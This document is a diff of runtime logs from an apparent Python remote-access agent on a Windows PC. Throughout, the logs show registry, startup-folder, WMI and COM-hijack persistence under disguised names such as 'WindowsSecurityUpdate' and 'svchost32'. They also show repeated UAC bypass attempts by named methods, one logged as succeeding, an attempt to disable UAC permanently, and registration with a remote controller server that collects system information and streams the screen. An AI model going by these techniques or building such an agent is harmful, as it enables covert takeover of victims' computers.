+[INFO] [WARN] Failed to create backup at C:\Users\Brylle\AppData\Roaming\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
+2026-01-03 08:17:17,136 - INFO - [WARN] Failed to create backup at C:\Users\Brylle\AppData\Roaming\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
+[INFO] [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
+2026-01-03 08:17:17,139 - INFO - [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
+[INFO] [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Temp\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
+2026-01-03 08:17:17,141 - INFO - [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Temp\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
+[INFO] [SKIP] Tamper protection disabled to prevent popup windows
+2026-01-03 08:17:17,142 - INFO - [SKIP] Tamper protection disabled to prevent popup windows
+[INFO] [DEBUG] Running as Python script: "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\client.py"
+2026-01-03 08:17:17,143 - INFO - [DEBUG] Running as Python script: "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\client.py"
+[INFO] [INFO] Deploying to stealth location...
+2026-01-03 08:17:17,144 - INFO - [INFO] Deploying to stealth location...
+[WARNING] [WARN] Cannot deploy Python script as executable - run PyInstaller first
+2026-01-03 08:17:17,145 - WARNING - [WARN] Cannot deploy Python script as executable - run PyInstaller first
+[INFO] [ERROR] Failed to deploy to stealth location: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Local\\Microsoft\\Windows\\svchost32.bat'
+2026-01-03 08:17:17,148 - INFO - [ERROR] Failed to deploy to stealth location: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Local\\Microsoft\\Windows\\svchost32.bat'
+[INFO] [OK] Registry persistence established: "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\client.py"
+2026-01-03 08:17:17,150 - INFO - [OK] Registry persistence established: "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\client.py"
+[INFO] [DEBUG] Registry entry verified: svchost32 = "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\client.py"
+2026-01-03 08:17:17,151 - INFO - [DEBUG] Registry entry verified: svchost32 = "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\client.py"
+[INFO] [OK] Registry persistence exists: svchost32 = "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\client.py"
+2026-01-03 08:17:17,152 - INFO - [OK] Registry persistence exists: svchost32 = "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\client.py"
+[INFO] [WARN] Target file does not exist: C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\client.py
+2026-01-03 08:17:17,153 - INFO - [WARN] Target file does not exist: C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\client.py
+[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
+2026-01-03 08:17:17,154 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
+[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
+2026-01-03 08:17:17,157 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
+[INFO] [OK] Agent starting with ID: DESKTOP-8SOSPFT
+2026-01-03 08:17:17,158 - INFO - [OK] Agent starting with ID: DESKTOP-8SOSPFT
+[INFO] Will notify controller (client-only) after connect
+2026-01-03 08:17:17,158 - INFO - Will notify controller (client-only) after connect
+[INFO] Initializing connection to server...
+2026-01-03 08:17:17,160 - INFO - Initializing connection to server...
+[INFO] Registering Socket.IO event handlers...
+2026-01-03 08:17:17,160 - INFO - Registering Socket.IO event handlers...
+[INFO] Socket.IO event handlers registered successfully
+2026-01-03 08:17:17,161 - INFO - Socket.IO event handlers registered successfully
+[INFO] [OK] Socket.IO event handlers registered (will persist across reconnections)
+2026-01-03 08:17:17,162 - INFO - [OK] Socket.IO event handlers registered (will persist across reconnections)
+[INFO] Starting connection health monitor...
+2026-01-03 08:17:17,162 - INFO - Starting connection health monitor...
+[INFO] [HEALTH_MONITOR] Connection health monitor started
+2026-01-03 08:17:17,163 - INFO - [HEALTH_MONITOR] Connection health monitor started
+[ERROR] [UAC MANAGER] Method 'fodhelper' error: Fodhelper Protocol failed: Fodhelper protocol bypass failed: [WinError 740] The requested operation requires elevation
+2026-01-03 08:17:17,164 - ERROR - [UAC MANAGER] Method 'fodhelper' error: Fodhelper Protocol failed: Fodhelper protocol bypass failed: [WinError 740] The requested operation requires elevation
+[DEBUG] [X] [UAC MANAGER] Method 'fodhelper' FAILED
+[INFO] [OK] Connection health monitor started (checks every 1 second)
+2026-01-03 08:17:17,276 - INFO - [OK] Connection health monitor started (checks every 1 second)
+[INFO] Connecting to server at https://agent-controller-backend.onrender.com (attempt 1)...
+2026-01-03 08:17:17,277 - INFO - Connecting to server at https://agent-controller-backend.onrender.com (attempt 1)...
+[DEBUG] ================================================================================
+[DEBUG] [UAC MANAGER] Attempt 4/9: computerdefaults
+[DEBUG] ================================================================================
+[INFO] [UAC MANAGER] Attempt 4/9: computerdefaults
+2026-01-03 08:17:28,109 - INFO - [UAC MANAGER] Attempt 4/9: computerdefaults
+[INFO] [UAC MANAGER] Executing method: Computer Defaults
+2026-01-03 08:17:28,111 - INFO - [UAC MANAGER] Executing method: Computer Defaults
+[DEBUG]   [METHOD] Checking if Computer Defaults is available...
+[DEBUG]   [OK] [METHOD] Computer Defaults is AVAILABLE
+[WARNING] [UAC BYPASS DEBUG] Computer Defaults starting in full debug mode
+2026-01-03 08:17:28,117 - WARNING - [UAC BYPASS DEBUG] Computer Defaults starting in full debug mode
+[DEBUG]   [METHOD] Executing Computer Defaults (ID: 33)...
+[INFO] [UAC BYPASS] Attempting method: Computer Defaults (ID: 33)
+2026-01-03 08:17:28,118 - INFO - [UAC BYPASS] Attempting method: Computer Defaults (ID: 33)
+[WARNING] [UAC BYPASS DEBUG] Skipping registry cleanup for Software\Classes\ms-settings\Shell\Open\command
+2026-01-03 08:17:28,148 - WARNING - [UAC BYPASS DEBUG] Skipping registry cleanup for Software\Classes\ms-settings\Shell\Open\command
+[DEBUG]   [X] [METHOD] Computer Defaults EXCEPTION: Computer defaults bypass failed: [WinError 740] The requested operation requires elevation
+[ERROR] [UAC BYPASS] Method Computer Defaults failed: Computer defaults bypass failed: [WinError 740] The requested operation requires elevation
+2026-01-03 08:17:28,149 - ERROR - [UAC BYPASS] Method Computer Defaults failed: Computer defaults bypass failed: [WinError 740] The requested operation requires elevation
+[ERROR] [UAC MANAGER] Method 'computerdefaults' error: Computer Defaults failed: Computer defaults bypass failed: [WinError 740] The requested operation requires elevation
+2026-01-03 08:17:41,349 - ERROR - [UAC MANAGER] Method 'computerdefaults' error: Computer Defaults failed: Computer defaults bypass failed: [WinError 740] The requested operation requires elevation
+[DEBUG] [X] [UAC MANAGER] Method 'computerdefaults' FAILED
+[DEBUG] ================================================================================
+[DEBUG] [UAC MANAGER] Attempt 5/9: silentcleanup
+[DEBUG] ================================================================================
+[INFO] [UAC MANAGER] Attempt 5/9: silentcleanup
+2026-01-03 08:17:51,789 - INFO - [UAC MANAGER] Attempt 5/9: silentcleanup
+[INFO] [UAC MANAGER] Executing method: SilentCleanup
+2026-01-03 08:17:51,790 - INFO - [UAC MANAGER] Executing method: SilentCleanup
+[DEBUG]   [METHOD] Checking if SilentCleanup is available...
+[DEBUG]   [OK] [METHOD] SilentCleanup is AVAILABLE
+[WARNING] [UAC BYPASS DEBUG] SilentCleanup starting in full debug mode
+2026-01-03 08:17:51,791 - WARNING - [UAC BYPASS DEBUG] SilentCleanup starting in full debug mode
+[DEBUG]   [METHOD] Executing SilentCleanup (ID: 34)...
+[INFO] [UAC BYPASS] Attempting method: SilentCleanup (ID: 34)
+2026-01-03 08:17:51,792 - INFO - [UAC BYPASS] Attempting method: SilentCleanup (ID: 34)
+[INFO] [OK] Controller is reachable (HTTP 200)
+2026-01-03 08:17:52,108 - INFO - [OK] Controller is reachable (HTTP 200)
+[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
+2026-01-03 08:17:53,331 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
+[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
+2026-01-03 08:17:53,334 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
+[INFO] [CONNECT] Connected to controller, registering agent DESKTOP-8SOSPFT
+2026-01-03 08:17:53,336 - INFO - [CONNECT] Connected to controller, registering agent DESKTOP-8SOSPFT
+[INFO] [HEALTH_MONITOR] ❌ Connection LOST - initiating cleanup...
+2026-01-03 08:17:54,530 - INFO - [HEALTH_MONITOR] ❌ Connection LOST - initiating cleanup...
+[INFO] [CLEANUP] Stopping all active operations...
+2026-01-03 08:17:54,531 - INFO - [CLEANUP] Stopping all active operations...
+[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
+2026-01-03 08:17:54,532 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
+[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
+2026-01-03 08:17:54,533 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
+[INFO] WebRTC streaming stopped for agent DESKTOP-8SOSPFT
+2026-01-03 08:17:54,541 - INFO - WebRTC streaming stopped for agent DESKTOP-8SOSPFT
+[INFO] [CLEANUP] WebRTC streaming stopped
+2026-01-03 08:17:54,542 - INFO - [CLEANUP] WebRTC streaming stopped
+[INFO] [CLEANUP] All operations stopped
+2026-01-03 08:17:54,542 - INFO - [CLEANUP] All operations stopped
+[INFO] [HEALTH_MONITOR] Triggering forced reconnection...
+2026-01-03 08:17:54,543 - INFO - [HEALTH_MONITOR] Triggering forced reconnection...
+[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
+2026-01-03 08:17:54,910 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
+[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
+2026-01-03 08:17:54,912 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
+[INFO] 📢 Notification emitted: Agent Connected (system)
+2026-01-03 08:17:54,913 - INFO - 📢 Notification emitted: Agent Connected (system)
+[INFO] [OK] Connected to server successfully!
+2026-01-03 08:17:54,914 - INFO - [OK] Connected to server successfully!
+[WARNING] Email not sent: missing Gmail credentials or recipient
+2026-01-03 08:17:54,916 - WARNING - Email not sent: missing Gmail credentials or recipient
+[INFO] [INFO] Event handlers already registered and active
+2026-01-03 08:17:54,916 - INFO - [INFO] Event handlers already registered and active
+[INFO] [INFO] Registering agent DESKTOP-8SOSPFT with controller...
+2026-01-03 08:17:54,917 - INFO - [INFO] Registering agent DESKTOP-8SOSPFT with controller...
+[INFO] [OK] Agent DESKTOP-8SOSPFT registration sent to controller
+2026-01-03 08:17:56,513 - INFO - [OK] Agent DESKTOP-8SOSPFT registration sent to controller
+[INFO] [OK] Agent system info sent to controller
+2026-01-03 08:17:56,516 - INFO - [OK] Agent system info sent to controller
+[INFO] [OK] Heartbeat started
+2026-01-03 08:17:56,521 - INFO - [OK] Heartbeat started
+[DEBUG]   [OK][OK][OK] [METHOD] SilentCleanup SUCCESS!
+[SUCCESS] ✅ [UAC BYPASS] SUCCESS! Method SilentCleanup worked!
+2026-01-03 08:17:56,947 - INFO - ✅ [UAC BYPASS] SUCCESS! Method SilentCleanup worked!
+[SUCCESS] ✅ [UAC MANAGER] Method 'silentcleanup' succeeded!
+2026-01-03 08:17:56,948 - INFO - ✅ [UAC MANAGER] Method 'silentcleanup' succeeded!
+[DEBUG] ================================================================================
+[DEBUG] [OK] [UAC MANAGER] SUCCESS! Method 'silentcleanup' worked!
+[DEBUG] ================================================================================
+[SUCCESS] ✅ [UAC MANAGER] UAC bypass successful with method: silentcleanup!
+2026-01-03 08:17:56,950 - INFO - ✅ [UAC MANAGER] UAC bypass successful with method: silentcleanup!
+[DEBUG] ================================================================================
+[DEBUG] [OK] [UAC BYPASS] Elevated instance launched successfully!
+[DEBUG] [OK] [UAC BYPASS] Checking if THIS process gained admin...
+[DEBUG] ================================================================================
+[DEBUG] [X] [ADMIN CHECK] Running as NORMAL USER (not admin)
+[DEBUG] [!] [UAC BYPASS] Elevated instance launched, but THIS process is still NOT admin
+[DEBUG] [!] [UAC BYPASS] The elevated instance will take over
+[WARNING] ⚠️ [UAC BYPASS] Elevated instance launched
+2026-01-03 08:17:58,955 - WARNING - ⚠️ [UAC BYPASS] Elevated instance launched
+[DEBUG] ℹ️ [UAC BYPASS] Keeping original process running (KEEP_ORIGINAL_PROCESS=True)
+[DEBUG] ℹ️ [UAC BYPASS] Note: Both non-admin and admin instances are now running
+[INFO] ℹ️ Original process will continue running alongside elevated instance
+2026-01-03 08:17:58,957 - INFO - ℹ️ Original process will continue running alongside elevated instance
+[DEBUG] ================================================================================
+[DEBUG] [OK] [UAC BYPASS] SUCCESS! Admin privileges gained!
+[DEBUG] ================================================================================
+[INFO] ✅ UAC bypass successful! Now running with admin privileges!
+2026-01-03 08:17:58,958 - INFO - ✅ UAC bypass successful! Now running with admin privileges!
 [DEBUG] [UAC] Disabling UAC permanently...
-[INFO] 🔧 Disabling UAC permanently...
-2025-12-28 06:28:01,894 - INFO - 🔧 Disabling UAC permanently...
-[DEBUG] [OK] [ADMIN CHECK] Running as ADMINISTRATOR
-[DEBUG] [UAC] Already admin - using direct method
+[DEBUG] [X] [ADMIN CHECK] Running as NORMAL USER (not admin)
+[DEBUG] [UAC] Not admin - using bootstrap method (no password needed)
+[DEBUG] ================================================================================
+[DEBUG] [BOOTSTRAP] UAC DISABLE WITHOUT ADMIN PRIVILEGES!
+[DEBUG] [BOOTSTRAP] Using UAC bypass to gain admin, then disable UAC
+[DEBUG] ================================================================================
+[DEBUG] [X] [ADMIN CHECK] Running as NORMAL USER (not admin)
+[DEBUG] [BOOTSTRAP] Not admin - using UAC bypass methods to elevate...
+[DEBUG] [BOOTSTRAP] This works WITHOUT password from standard user account!
+[DEBUG] [BOOTSTRAP] Created elevation script: C:\Users\Brylle\AppData\Local\Temp\uac_disable_elevated.py
+[DEBUG]
+[BOOTSTRAP] Attempting UAC bypass methods...
+[DEBUG] [BOOTSTRAP] UAC Manager loaded with 9 methods
+[INFO] [UAC MANAGER] 9/9 methods available
+2026-01-03 08:17:58,969 - INFO - [UAC MANAGER] 9/9 methods available
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: eventvwr
+[DEBUG] [BOOTSTRAP] EventVwr bypass error: [WinError 740] The requested operation requires elevation
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: sdclt
+[DEBUG] [BOOTSTRAP] Sdclt bypass error: [WinError 740] The requested operation requires elevation
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: fodhelper
+[DEBUG] [BOOTSTRAP] Fodhelper bypass error: [WinError 740] The requested operation requires elevation
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: computerdefaults
+[DEBUG] [BOOTSTRAP] ComputerDefaults bypass error: [WinError 740] The requested operation requires elevation
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: silentcleanup
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: icmluautil
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: slui
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: wsreset
+[DEBUG]
+[BOOTSTRAP] Trying UAC bypass: winsat
+[DEBUG] [BOOTSTRAP] All UAC bypass methods failed
+[DEBUG] ================================================================================
+[DEBUG] [X] [BOOTSTRAP] Could not gain admin via UAC bypass
+[DEBUG] [X] Falling back to standard UAC disable (requires admin)
+[DEBUG] ================================================================================
 [DEBUG] ================================================================================
 [DEBUG] [UAC DISABLE] STARTING SILENT UAC DISABLE
 [DEBUG] [UAC DISABLE] This will DISABLE admin password popups for ALL applications!
 [DEBUG] ================================================================================
 [DEBUG] ================================================================================
 [DEBUG] [UAC VERIFY] Current UAC Status:
-[DEBUG]   EnableLUA: 0 (0=Disabled, 1=Enabled)
-[DEBUG]   ConsentPromptBehaviorAdmin: 0
+[DEBUG]   EnableLUA: 1 (0=Disabled, 1=Enabled)
+[DEBUG]   ConsentPromptBehaviorAdmin: 2
 [DEBUG]     0 = No prompts (DISABLED)
 [DEBUG]     1 = Password required (STRICT)
 [DEBUG]     5 = Just click Yes (CONSENT)
-[DEBUG]   PromptOnSecureDesktop: 0 (0=Off, 1=On)
-[DEBUG]   [OK] STATUS: UAC FULLY DISABLED - No admin password popups!
+[DEBUG]   PromptOnSecureDesktop: 1 (0=Off, 1=On)
+[DEBUG]   ⚪ STATUS: Custom mode (ConsentPromptBehaviorAdmin=2)
 [DEBUG] ================================================================================
-[DEBUG] [UAC DISABLE] [OK] UAC already fully disabled - no action needed!
-[DEBUG] [OK] [UAC] UAC disabled successfully!
-[INFO] ✅ UAC permanently disabled - no more prompts!
-2025-12-28 06:28:01,897 - INFO - ✅ UAC permanently disabled - no more prompts!
-[DEBUG] [OK] [ADMIN CHECK] Running as ADMINISTRATOR
-[INFO] Setting up advanced persistence and tamper protection...
-2025-12-28 06:28:02,246 - INFO - Setting up advanced persistence and tamper protection...
-[INFO] [REGISTRY] Setting up persistence for: python.exe "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"
-2025-12-28 06:28:02,247 - INFO - [REGISTRY] Setting up persistence for: python.exe "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"
-[INFO] [REGISTRY] Attempting to create key: Software\Microsoft\Windows\CurrentVersion\Run
-2025-12-28 06:28:02,249 - INFO - [REGISTRY] Attempting to create key: Software\Microsoft\Windows\CurrentVersion\Run
-[INFO] [REGISTRY] Key created successfully: Software\Microsoft\Windows\CurrentVersion\Run
-2025-12-28 06:28:02,251 - INFO - [REGISTRY] Key created successfully: Software\Microsoft\Windows\CurrentVersion\Run
-[INFO] [REGISTRY] Setting value 'WindowsSecurityUpdate' = 'python.exe "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"'
-2025-12-28 06:28:02,252 - INFO - [REGISTRY] Setting value 'WindowsSecurityUpdate' = 'python.exe "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"'
-[INFO] [REGISTRY] Value set successfully in Software\Microsoft\Windows\CurrentVersion\Run
-2025-12-28 06:28:02,252 - INFO - [REGISTRY] Value set successfully in Software\Microsoft\Windows\CurrentVersion\Run
-[INFO] [REGISTRY] Registry persistence setup completed. Success: 1/1 keys
-2025-12-28 06:28:02,253 - INFO - [REGISTRY] Registry persistence setup completed. Success: 1/1 keys
-[INFO] [OK] Startup folder entry created: C:\Users\Brylle\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SystemService.bat
-2025-12-28 06:28:02,254 - INFO - [OK] Startup folder entry created: C:\Users\Brylle\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SystemService.bat
-[INFO] [DEBUG] Running as Python script: "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"
-2025-12-28 06:28:02,280 - INFO - [DEBUG] Running as Python script: "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"
-[INFO] [INFO] Deploying to stealth location...
-2025-12-28 06:28:02,282 - INFO - [INFO] Deploying to stealth location...
-[WARNING] [WARN] Cannot deploy Python script as executable - run PyInstaller first
-2025-12-28 06:28:02,286 - WARNING - [WARN] Cannot deploy Python script as executable - run PyInstaller first
-[INFO] [ERROR] Failed to deploy to stealth location: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Local\\Microsoft\\Windows\\svchost32.bat'
-2025-12-28 06:28:02,287 - INFO - [ERROR] Failed to deploy to stealth location: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Local\\Microsoft\\Windows\\svchost32.bat'
-[INFO] [OK] Registry persistence established: "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"
-2025-12-28 06:28:02,289 - INFO - [OK] Registry persistence established: "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"
-[INFO] [DEBUG] Registry entry verified: svchost32 = "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"
-2025-12-28 06:28:02,291 - INFO - [DEBUG] Registry entry verified: svchost32 = "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"
-[INFO] [OK] Input controllers initialized
-2025-12-28 06:28:02,292 - INFO - [OK] Input controllers initialized
-[INFO] Initialization progress: [====--] 4/6 tasks complete.
-2025-12-28 06:28:02,297 - INFO - Initialization progress: [====--] 4/6 tasks complete.
-[INFO] ============================================================
-2025-12-28 06:28:02,299 - INFO - ============================================================
-[INFO] Advanced Python Agent v2.0
-2025-12-28 06:28:02,299 - INFO - Advanced Python Agent v2.0
-[INFO] Starting up...
-2025-12-28 06:28:02,300 - INFO - Starting up...
-[INFO] ============================================================
-2025-12-28 06:28:02,300 - INFO - ============================================================
-[INFO] [INFO] Running from original location - will deploy to stealth location
-2025-12-28 06:28:02,302 - INFO - [INFO] Running from original location - will deploy to stealth location
-[INFO] Checking system requirements...
-2025-12-28 06:28:02,304 - INFO - Checking system requirements...
-[INFO] All critical requirements satisfied
-2025-12-28 06:28:02,305 - INFO - All critical requirements satisfied
-[INFO] Optional features available: Screen capture, Audio processing, Image processing, GUI automation, Input monitoring, OpenCV, NumPy, Speech recognition, WebSockets, Pygame
-2025-12-28 06:28:02,306 - INFO - Optional features available: Screen capture, Audio processing, Image processing, GUI automation, Input monitoring, OpenCV, NumPy, Speech recognition, WebSockets, Pygame
-[INFO] Running on Windows - initializing Windows-specific features...
-2025-12-28 06:28:02,306 - INFO - Running on Windows - initializing Windows-specific features...
-[DEBUG] [OK] [ADMIN CHECK] Running as ADMINISTRATOR
-[INFO] [OK] Running with administrator privileges
-2025-12-28 06:28:02,307 - INFO - [OK] Running with administrator privileges
-[INFO] Setting up advanced persistence and tamper protection...
-2025-12-28 06:28:02,308 - INFO - Setting up advanced persistence and tamper protection...
-[INFO] [REGISTRY] Setting up persistence for: python.exe "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"
-2025-12-28 06:28:02,308 - INFO - [REGISTRY] Setting up persistence for: python.exe "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"
-[INFO] [REGISTRY] Attempting to create key: Software\Microsoft\Windows\CurrentVersion\Run
-2025-12-28 06:28:02,308 - INFO - [REGISTRY] Attempting to create key: Software\Microsoft\Windows\CurrentVersion\Run
-[INFO] [REGISTRY] Key created successfully: Software\Microsoft\Windows\CurrentVersion\Run
-2025-12-28 06:28:02,309 - INFO - [REGISTRY] Key created successfully: Software\Microsoft\Windows\CurrentVersion\Run
-[INFO] [REGISTRY] Setting value 'WindowsSecurityUpdate' = 'python.exe "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"'
-2025-12-28 06:28:02,309 - INFO - [REGISTRY] Setting value 'WindowsSecurityUpdate' = 'python.exe "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"'
-[INFO] [REGISTRY] Value set successfully in Software\Microsoft\Windows\CurrentVersion\Run
-2025-12-28 06:28:02,310 - INFO - [REGISTRY] Value set successfully in Software\Microsoft\Windows\CurrentVersion\Run
-[INFO] [REGISTRY] Registry persistence setup completed. Success: 1/1 keys
-2025-12-28 06:28:02,310 - INFO - [REGISTRY] Registry persistence setup completed. Success: 1/1 keys
-[INFO] [OK] Startup folder entry created: C:\Users\Brylle\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SystemService.bat
-2025-12-28 06:28:02,316 - INFO - [OK] Startup folder entry created: C:\Users\Brylle\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SystemService.bat
-[INFO] [WARN] TurboJPEG not available, using fallback compression
-2025-12-28 06:28:02,400 - INFO - [WARN] TurboJPEG not available, using fallback compression
-[INFO] [OK] High-performance capture initialized
-2025-12-28 06:28:02,400 - INFO - [OK] High-performance capture initialized
-[INFO] Low latency input handler started
-2025-12-28 06:28:02,401 - INFO - Low latency input handler started
-[INFO] [OK] Low-latency input handler initialized
-2025-12-28 06:28:02,401 - INFO - [OK] Low-latency input handler initialized
-[INFO] [WARN] Failed to initialize WebRTC components: There is no current event loop in thread 'Thread-16 (task_wrapper)'.
-2025-12-28 06:28:02,405 - INFO - [WARN] Failed to initialize WebRTC components: There is no current event loop in thread 'Thread-16 (task_wrapper)'.
-[DEBUG] [OK] [ADMIN CHECK] Running as ADMINISTRATOR
-[DEBUG] [OK] [ADMIN CHECK] Running as ADMINISTRATOR
-[INFO] [WARN] Failed to establish system persistence at C:\Windows\System32\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:02,547 - INFO - [WARN] Failed to establish system persistence at C:\Windows\System32\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] [WARN] Failed to establish system persistence at C:\Windows\SysWOW64\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:02,548 - INFO - [WARN] Failed to establish system persistence at C:\Windows\SysWOW64\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] [WARN] Failed to establish system persistence at C:\Windows\System32\drivers\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:02,548 - INFO - [WARN] Failed to establish system persistence at C:\Windows\System32\drivers\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[DEBUG] [OK] [ADMIN CHECK] Running as ADMINISTRATOR
-[DEBUG] [OK] [ADMIN CHECK] Running as ADMINISTRATOR
-[INFO] [WARN] Failed to establish system persistence at C:\Windows\System32\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:02,600 - INFO - [WARN] Failed to establish system persistence at C:\Windows\System32\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] [WARN] Failed to establish system persistence at C:\Windows\SysWOW64\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:02,602 - INFO - [WARN] Failed to establish system persistence at C:\Windows\SysWOW64\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] [WARN] Failed to establish system persistence at C:\Windows\System32\drivers\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:02,604 - INFO - [WARN] Failed to establish system persistence at C:\Windows\System32\drivers\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] Initialization progress: [=====-] 5/6 tasks complete..
-2025-12-28 06:28:04,805 - INFO - Initialization progress: [=====-] 5/6 tasks complete..
-[INFO] [OK] WMI event persistence established
-2025-12-28 06:28:04,850 - INFO - [OK] WMI event persistence established
-[INFO] [OK] COM hijacking persistence established: {00021401-0000-0000-C000-000000000046}
-2025-12-28 06:28:04,851 - INFO - [OK] COM hijacking persistence established: {00021401-0000-0000-C000-000000000046}
-[INFO] [SKIP] Watchdog persistence disabled to prevent popup windows
-2025-12-28 06:28:04,852 - INFO - [SKIP] Watchdog persistence disabled to prevent popup windows
-[INFO] [WARN] Failed to create backup at C:\Users\Brylle\AppData\Roaming\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:04,856 - INFO - [WARN] Failed to create backup at C:\Users\Brylle\AppData\Roaming\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
